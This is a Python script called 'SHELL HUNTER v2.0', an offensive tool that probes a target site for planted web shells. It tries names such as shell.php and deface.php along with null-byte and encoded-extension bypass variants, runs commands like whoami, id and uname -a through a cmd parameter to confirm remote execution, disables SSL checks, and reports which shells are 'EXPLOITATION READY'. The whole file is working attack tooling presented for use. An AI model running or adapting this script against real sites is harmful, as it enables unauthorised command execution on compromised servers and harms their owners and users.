#!/usr/bin/env python3
import requests
import sys
from colorama import Fore, init
import urllib3
urllib3.disable_warnings()

init(autoreset=True)

def banner():
    print(f"""
{Fore.GREEN}
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █ SHELL HUNTER v2.0 - SSL-PROOF VERIFICATION                         █
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    """)

def create_session():
    s = requests.Session()
    s.verify = False
    return s

def test_shell(url, session):
    """Comprehensive shell test"""
    tests = [
        "?cmd=whoami",
        "?cmd=id", 
        "?cmd=uname -a",
        "?cmd=ls -la",
        "?cmd=dir"
    ]
    
    for test in tests:
        try:
            r = session.get(url + test, timeout=5)
            if r.status_code == 200 and len(r.text.strip()) > 5:
                return True, r.text.strip()[:100]
        except:
            pass
    return False, ""

def main():
    banner()
    
    base_url = input(f"{Fore.YELLOW}[?] Base path (ex: https://target.com/images/): ").strip()
    if not base_url.endswith('/'):
        base_url += '/'
    
    session = create_session()
    shells = [
        "shell.php", "deface.php", "shell.jpg.php", "index.php",
        "shell%00.php", "shell%2ephp", "shell%09.php", "upload.php",
        "banner.php", "images.php", "shell.jpg"
    ]
    
    print(f"{Fore.CYAN}\n{'='*70}")
    print(f"🔍 HUNTING LIVE SHELLS in {base_url}")
    print(f"{'='*70}\n")
    
    live_shells = []
    
    for shell in shells:
        url = base_url + shell
        try:
            r = session.get(url, timeout=5)
            if r.status_code == 200:
                is_exec, output = test_shell(url, session)
                
                status = "🟢 LIVE EXEC" if is_exec else "🟡 LIVE FILE"
                preview = output if is_exec else r.text[:80]
                
                print(f"{status} {Fore.CYAN}{url}")
                print(f"  Status: {r.status_code} | {preview}...")
                
                if is_exec:
                    live_shells.append(url)
                print()
                
        except Exception as e:
            pass
    
    # FINAL REPORT
    print(f"{Fore.GREEN+'='*70}")
    print(f"🎯 VERIFICATION COMPLETE!")
    
    if live_shells:
        print(f"✅ {len(live_shells)} EXECUTABLE SHELLS FOUND!")
        print(f"\n{Fore.YELLOW}QUICK ACCESS:")
        for shell in live_shells:
            print(f"  → {shell}")
        print(f"\n{Fore.RED}💥 SHELL ACCESS CONFIRMED - EXPLOITATION READY!")
    else:
        print(f"{Fore.YELLOW}No executable shells. Check file uploads manually.")
    
    print(f"{'='*70}")

if __name__ == "__main__":
    main()
    print(f"\n{Fore.YELLOW}Done! Check LIVE SHELLS above.")
    input("Press ENTER to exit...")